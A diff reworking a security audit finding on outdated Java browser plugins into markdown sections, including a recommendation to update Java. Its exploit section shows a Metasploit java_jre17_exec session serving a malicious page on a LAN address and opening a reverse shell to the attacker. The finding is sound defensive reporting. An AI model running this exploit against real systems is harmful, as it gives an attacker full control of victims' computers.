@@ -1,36 +1,26 @@
+## summary
 
-Title
-
-4.1.1 Outdated Java browser plugins
-Priority
-
-High
-Summary
+Outdated Java browser plugins
 
 One or more of the organization’s laptops were seen to be running an outdated, known-vulnerable version of the Java plugin for Internet Explorer.
-Description
+
+
+## description
 
 This version contains a vulnerability that is easily exploitable using one of the recent Java exploit modules from the widely available Metasploit security auditing framework. These modules allow an attacker to gain complete control over the computer of a victim who visits a malicious Web site hosted anywhere on the Internet. If the attacker is inside the office LAN, he can easily trick the victim into visiting that malicious Web site without the victim even knowing it.
-MitigationTitle
 
-Update key software on staff machines
-MitigationDescription
+## recommendation
 
 At least one of the organization’s computers is running an outdated Java browser plugin, and exploit code is widely-available for several critical vulnerabilities in versions older than “Java 7, update 16.” All of the organization’s Java installations should be updated to the latest version. This can be troublesome, as (unlike the Windows operating system itself) Java plugins sometimes require user input before they will install updates.
-Assets affected by this issue
 
-    4.1 Software version assessment (1 instance)
 
-Evidence for 4.1 Software version assessment
-Title
-
-4.1.1 [sample evidence] Outdated Java browser plugins
-Description
+## exploit
 
 While the threat described below is more severe if carried out by a local attacker (as she can more readily direct the victim to her malicious Web site), it also works remotely. In fact, if a user can be tricked, by a remote attacker, into clicking on a malicious email or Web link, attacks like this represent a significant perimeter threat. By compromising the victim’s machine, they can give the attacker a local point-of-presence without requiring her to crack WPA keys or gain local access in some other way.
 
 Step 1: Using Metasploit, an attacker can easily create an ad hoc malicious Web site:
 
+```
 $ msfconsole 
 
 IIIIII    dTb.dTb        _.---._
@@ -63,11 +53,11 @@ URIPATH => java_test
 
 msf exploit(java_jre17_exec) > run
 [*] Exploit running as background job.
-...
+```
 
 Step 2: At this point, any local user who visits http://192.168.1.123:8081/java_test, and who is running a sufficiently out-of-date version of the Java browser plugin, stands a good chance of giving the attacker full access to his computer:
 
-...
+```
 [*] Started reverse handler on 192.168.1.123:4444 
 
 msf exploit(java_jre17_exec) > 
@@ -79,5 +69,6 @@ msf exploit(java_jre17_exec) >
 msf exploit(java_jre17_exec) > 
 
 <remote shell>
+```
 
 Figure 1: Attacker in control of the victim’s computer through a remote command shell
